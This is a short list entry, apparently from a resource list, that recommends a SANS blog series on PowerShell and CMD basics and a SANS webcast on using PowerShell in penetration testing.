				- [SANS](https://www.sans.org/blog/getting-started-with-powershell/) Has a great blog set that details the usage of many PowerShell and CMD components. As a bonus, this webcast on the use of [PowerShell in Pentesting](https://www.sans.org/webcasts/powershell-pentesting-108305/) is worth the watch.